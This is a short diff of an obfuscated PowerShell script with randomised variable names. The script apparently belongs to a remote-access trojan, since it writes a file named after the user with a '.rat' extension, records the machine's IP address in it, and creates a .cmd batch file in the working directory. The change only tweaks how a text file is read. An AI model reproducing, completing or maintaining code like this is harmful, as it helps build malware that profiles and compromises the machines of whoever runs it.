@@ -29,7 +29,7 @@ $FrNAQBWSnJ = RpLGWiUsIy
 $qsQBioVOkY = "$env:temp\$FrNAQBWSnJ"
 $NyZnoLKCIs = Get-Location
 $CRYnrkaDbe = "$env:UserName.rat"
-$PEBgxuJUfd = Get-Content lawFvVTikZ.txt
+$PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
 $AhdjktGyiZ = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
 Add-Content -Path "$NyZnoLKCIs/GiLqXiexKP.cmd" -Value "@echo off"
 Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
